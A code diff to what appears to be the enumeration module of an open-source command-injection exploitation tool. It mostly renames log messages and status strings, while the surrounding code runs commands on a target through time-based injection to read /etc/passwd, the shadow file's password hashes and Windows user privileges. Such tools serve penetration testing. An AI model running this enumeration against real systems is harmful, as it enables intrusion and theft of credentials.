@@ -49,17 +49,17 @@ def powershell_version(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
     if float(ps_version):
       settings.PS_ENABLED = True
       ps_version = "".join(str(p) for p in output)
-      if settings.VERBOSITY_LEVEL <= 1 and _:
+      if settings.VERBOSITY_LEVEL < 1 and _:
         print("")
       # Output PowerShell's version number
-      success_msg = "The PowerShell's version number is " 
-      success_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
-      sys.stdout.write(settings.print_success_msg(success_msg) + ".")
+      info_msg = "The PowerShell's version number is " 
+      info_msg += ps_version + Style.RESET_ALL + Style.BRIGHT
+      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file. 
       output_file = open(filename, "a")
-      success_msg = "The PowerShell's version number is " + ps_version + ".\n"
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+      info_msg = "The PowerShell's version number is " + ps_version + ".\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
   except ValueError:
     warn_msg = "Heuristics have failed to identify the version of Powershell, "
@@ -82,15 +82,15 @@ def hostname(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, h
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   shell = output 
   if shell:
-    if settings.VERBOSITY_LEVEL <= 1 and _:
+    if settings.VERBOSITY_LEVEL < 1 and _:
       print("")
-    success_msg = "The hostname is " +  str(shell)
-    sys.stdout.write(settings.print_success_msg(success_msg) + ".")
+    info_msg = "The hostname is " +  str(shell)
+    sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
     sys.stdout.flush()
     # Add infos to logs file. 
     output_file = open(filename, "a")
-    success_msg = "The hostname is " + str(shell) + ".\n"
-    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+    info_msg = "The hostname is " + str(shell) + ".\n"
+    output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
     output_file.close()
   else:
     warn_msg = "Heuristics have failed to identify the hostname."
@@ -112,13 +112,13 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
   else:
     output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   target_os = output
-  if settings.VERBOSITY_LEVEL <= 1 and _:
+  if settings.VERBOSITY_LEVEL < 1 and _:
     print("")
   if target_os:
     if settings.TARGET_OS != "win":
       cmd = settings.DISTRO_INFO
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
-        if settings.VERBOSITY_LEVEL <= 1 and _:
+        if settings.VERBOSITY_LEVEL < 1 and _:
           sys.stdout.write("")
         check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
         session_handler.store_cmd(url, cmd, output, vuln_parameter)
@@ -132,7 +132,7 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
     else:
       cmd = settings.RECOGNISE_HP
     if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
-      if settings.VERBOSITY_LEVEL <= 1 and _:
+      if settings.VERBOSITY_LEVEL < 1 and _:
         sys.stdout.write("\n")
       # The main command injection exploitation.
       check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
@@ -141,17 +141,17 @@ def system_information(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, 
       output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
     target_arch = output
     if target_arch:
-      if settings.VERBOSITY_LEVEL <= 1 and _:
+      if settings.VERBOSITY_LEVEL < 1 and _:
         print("")
-      success_msg = "The target operating system is " +  str(target_os) + Style.RESET_ALL  
-      success_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
-      sys.stdout.write(settings.print_success_msg(success_msg) + ".")
+      info_msg = "The target operating system is " +  str(target_os) + Style.RESET_ALL  
+      info_msg += Style.BRIGHT + " and the hardware platform is " +  str(target_arch)
+      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file.   
       output_file = open(filename, "a")
-      success_msg = "The target operating system is " + str(target_os)
-      success_msg += " and the hardware platform is " + str(target_arch) + ".\n"
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+      info_msg = "The target operating system is " + str(target_os)
+      info_msg += " and the hardware platform is " + str(target_arch) + ".\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
   else:
     warn_msg = "Heuristics have failed to retrieve the system information."
@@ -181,7 +181,7 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
       else:  
         cmd = settings.IS_ROOT 
       if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
-        if settings.VERBOSITY_LEVEL <= 1 and _:
+        if settings.VERBOSITY_LEVEL < 1 and _:
           sys.stdout.write("\n")
         # The main command injection exploitation.
         check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
@@ -189,14 +189,14 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
       else:
         output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
       shell = output 
-      if settings.VERBOSITY_LEVEL <= 1 and _:
+      if settings.VERBOSITY_LEVEL < 1 and _:
         print("")
-      success_msg = "The current user is " +  str(cu_account)  
-      sys.stdout.write(settings.print_success_msg(success_msg))
+      info_msg = "The current user is " +  str(cu_account)  
+      sys.stdout.write(settings.print_bold_info_msg(info_msg))
       # Add infos to logs file.    
       output_file = open(filename, "a")
-      success_msg = "The current user is " + str(cu_account)
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+      info_msg = "The current user is " + str(cu_account)
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
       if shell:
         shell = "".join(str(p) for p in shell)
@@ -216,15 +216,15 @@ def current_user(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
           output_file.write(" and it is privileged.\n")
           output_file.close()
     else:
-      if settings.VERBOSITY_LEVEL <= 1 and _:
+      if settings.VERBOSITY_LEVEL < 1 and _:
         print("")
-      success_msg = "The current user is " +  str(cu_account)
-      sys.stdout.write(settings.print_success_msg(success_msg) + ".")
+      info_msg = "The current user is " +  str(cu_account)
+      sys.stdout.write(settings.print_bold_info_msg(info_msg) + ".")
       sys.stdout.flush()
       # Add infos to logs file.   
       output_file = open(filename, "a")
-      success_msg = "The current user is " + str(cu_account) + "\n"
-      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+      info_msg = "The current user is " + str(cu_account) + "\n"
+      output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
       output_file.close()
   else:
     warn_msg = "Heuristics have failed to identify the current user."
@@ -253,35 +253,35 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
   sys_users = output 
   # Windows users enumeration.
   if settings.TARGET_OS == "win":
-    if settings.VERBOSITY_LEVEL <= 1 and _:
+    if settings.VERBOSITY_LEVEL < 1 and _:
       print("")
     info_msg = "Executing the 'net users' command "
-    info_msg += "to enumerate users entries... "  
+    info_msg += "to enumerate users entries. "  
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
       if sys_users[0] :
         sys_users = "".join(str(p) for p in sys_users).strip()
-        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.SUCCESS_STATUS)
         sys_users_list = re.findall(r"(.*)", sys_users)
         sys_users_list = "".join(str(p) for p in sys_users_list).strip()
         sys_users_list = ' '.join(sys_users_list.split())
         sys_users_list = sys_users_list.split()
-        success_msg =  "Identified " + str(len(sys_users_list))
-        success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-        success_msg += " via 'net users' command.\n"
-        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
+        info_msg =  "Identified " + str(len(sys_users_list))
+        info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+        info_msg += " via 'net users' command.\n"
+        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
         output_file.close()
         count = 0
         for user in range(0, len(sys_users_list)):
           count = count + 1
           if menu.options.privileges:
             info_msg = "Confirming privileges of user '" 
-            info_msg += sys_users_list[user] + "'... "
+            info_msg += sys_users_list[user] + "'. "
             print(settings.print_info_msg(info_msg))
             cmd = "powershell.exe -InputFormat none write-host (([string]$(net user " + sys_users_list[user] + ")[22..($(net user " + sys_users_list[user] + ").length-3)]).replace('Local Group Memberships','').replace('*','').Trim()).replace(' ','').substring(0,6)"
             if alter_shell:
@@ -309,26 +309,26 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
           output_file.write("      [" +str(count)+ "] " + sys_users_list[user] + is_privileged + ".\n" )
           output_file.close()
       else:
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.FAIL_STATUS)
         sys.stdout.flush()
         warn_msg = "It seems that you don't have permissions to enumerate users entries."
         print("\n" + settings.print_warning_msg(warn_msg))  
     except TypeError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
+      sys.stdout.write(settings.FAIL_STATUS + "\n")
       sys.stdout.flush()
       pass
     except IndexError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.write(settings.FAIL_STATUS)
       warn_msg = "It seems that you don't have permissions to enumerate users entries."
       sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
       sys.stdout.flush()
       pass
   # Unix-like users enumeration.    
   else:
-    if settings.VERBOSITY_LEVEL <= 1 and _:
+    if settings.VERBOSITY_LEVEL < 1 and _:
       print("")
     info_msg = "Fetching '" + settings.PASSWD_FILE 
-    info_msg += "' to enumerate users entries... "
+    info_msg += "' to enumerate users entries. "
     sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
     try:
@@ -340,7 +340,7 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
           sys_users = sys_users.split(" ")
         # Check for appropriate '/etc/passwd' format.
         if len(sys_users) % 3 != 0 :
-          sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+          sys.stdout.write(settings.FAIL_STATUS)
           sys.stdout.flush()
           warn_msg = "It seems that '" + settings.PASSWD_FILE + "' file is "
           warn_msg += "not in the appropriate format. Thus, it is expoted as a text file."
@@ -355,15 +355,15 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
           for user in range(0, len(sys_users), 3):
              sys_users_list.append(sys_users[user : user + 3])
           if len(sys_users_list) != 0 :
-            sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-            success_msg = "Identified " + str(len(sys_users_list)) 
-            success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
-            success_msg += " in '" +  settings.PASSWD_FILE + "'."
-            sys.stdout.write("\n" + settings.print_success_msg(success_msg))
+            sys.stdout.write(settings.SUCCESS_STATUS)
+            info_msg = "Identified " + str(len(sys_users_list)) 
+            info_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+            info_msg += " in '" +  settings.PASSWD_FILE + "'."
+            sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
             sys.stdout.flush()
             # Add infos to logs file.   
             output_file = open(filename, "a")
-            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg)
+            output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg)
             output_file.close()
             count = 0
             for user in range(0, len(sys_users_list)):
@@ -416,17 +416,17 @@ def system_users(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timese
                 output_file.write("      " + sys_users)
                 output_file.close()
       else:
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.FAIL_STATUS)
         warn_msg = "It seems that you don't have permissions to read '" 
         warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
         sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
         sys.stdout.flush()
     except TypeError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
+      sys.stdout.write(settings.FAIL_STATUS + "\n")
       sys.stdout.flush()
       pass
     except IndexError:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      sys.stdout.write(settings.FAIL_STATUS)
       warn_msg = "Some kind of WAF/IPS/IDS probably blocks the attempt to read '" 
       warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
       sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
@@ -455,22 +455,22 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, ti
     if sys_passes == "":
       sys_passes = " "
     if sys_passes :
-      info_msg = "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... "
+      info_msg = "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes. "
       sys.stdout.write(settings.print_info_msg(info_msg))
       sys.stdout.flush()
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
-        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-        success_msg = "Identified " + str(len(sys_passes))
-        success_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
-        success_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
-        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
+        sys.stdout.write(settings.SUCCESS_STATUS)
+        info_msg = "Identified " + str(len(sys_passes))
+        info_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+        info_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
+        sys.stdout.write("\n" + settings.print_bold_info_msg(info_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.SUCCESS_SIGN) + success_msg )
+        output_file.write(re.compile(re.compile(settings.ANSI_COLOR_REMOVAL)).sub("",settings.INFO_BOLD_SIGN) + info_msg )
         output_file.close()
         count = 0
         for line in sys_passes:
@@ -496,7 +496,7 @@ def system_passwords(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, ti
             output_file.write("      " + fields[0])
             output_file.close()
       else:
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(settings.FAIL_STATUS)
         warn_msg = "It seems that you don't have permissions to read '" 
         warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
         sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
